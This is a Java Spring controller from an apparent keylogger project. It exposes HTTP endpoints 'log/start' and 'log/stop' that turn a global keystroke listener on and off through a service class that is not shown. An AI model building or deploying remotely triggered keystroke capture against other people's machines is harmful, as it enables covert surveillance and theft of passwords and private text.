package com.badar.keylogger.Controllers;

import com.badar.keylogger.Services.GlobalKeyListenerService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;


@RestController
@RequestMapping("log")
public class GlobalKeyListenerController {

    @Autowired
    private GlobalKeyListenerService globalKeyListenerService;

    @GetMapping("start")
    public void startLogger() {
        globalKeyListenerService.startKeylogger();
    }

    @GetMapping("stop")
    public void stopLogger(){
        globalKeyListenerService.stopLogger();
    }
}
